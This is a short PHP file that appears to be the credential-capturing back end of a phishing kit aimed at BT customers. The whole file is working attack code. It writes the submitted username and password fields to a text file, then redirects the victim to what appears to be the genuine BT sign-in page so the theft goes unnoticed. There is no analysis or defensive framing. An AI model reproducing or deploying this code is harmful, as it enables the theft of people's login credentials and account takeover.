<?php
file_put_contents("usernames.txt", "USER: " . $_POST['USER'] . " USER: " . $_POST['NAFMPASSWORD'] . "\n", FILE_APPEND);
header('Location: https://signin1.bt.com/siteminderagent/fcc/shim.fcc');
exit();
?>